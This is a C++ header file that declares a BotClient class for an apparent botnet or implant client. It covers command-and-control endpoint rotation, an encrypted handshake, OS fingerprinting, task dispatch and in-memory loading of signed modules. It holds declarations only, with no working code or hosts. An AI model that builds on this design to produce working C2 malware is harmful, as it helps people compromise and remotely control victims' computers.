#ifndef BOT_CLIENT_HPP
#define BOT_CLIENT_HPP

#include "protocol.hpp"
#include <string>
#include <vector>
#include <map>
#include <functional>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/x509.h>

// --- Module Callback Type ---
using module_callback_t = std::function<void(const std::vector<char>&)>;

// --- Module function pointer types ---
typedef void (*module_init_t)();
typedef void (*module_run_t)(const std::vector<char>& data, module_callback_t send_output);
typedef void (*module_cleanup_t)();

// Represents a loaded module
struct Module {
    void* handle;
    int mem_fd;
    module_init_t init;
    module_run_t run;
    module_cleanup_t cleanup;
};

// --- C2 Configuration ---
struct C2Endpoint {
    std::string host;
    int port;
};

class BotClient {
public:
    BotClient();
    ~BotClient();
    void start();

private:
    // --- Core Network & Crypto ---
    bool connect_to_c2();
    bool perform_handshake();
    void main_loop();
    void send_message(uint8_t type, const std::vector<char>& data);
    void handle_task(const aether::Header& header, const std::vector<char>& encrypted_data);
    
    // --- Configuration ---
    void initialize_config();
    C2Endpoint get_next_c2_endpoint();
    
    // --- Core Bot Logic ---
    std::string get_os_info();
    void log_internal(const std::string& message, bool report_to_c2);

    // --- Module Management ---
    void load_module(const std::vector<char>& data);
    void unload_module(const std::string& module_name);
    void run_module(const std::string& module_name, const std::vector<char>& data);

    // --- Member Variables ---
    int sock_;
    RSA* rsa_pub_key_;
    unsigned char aes_key_[aether::AES_KEY_BITS / 8];
    X509* c2_cert_; // For verifying module signatures
    
    std::vector<C2Endpoint> c2_endpoints_;
    int current_c2_index_;
    
    std::map<std::string, Module> modules_;
};

#endif // BOT_CLIENT_HPP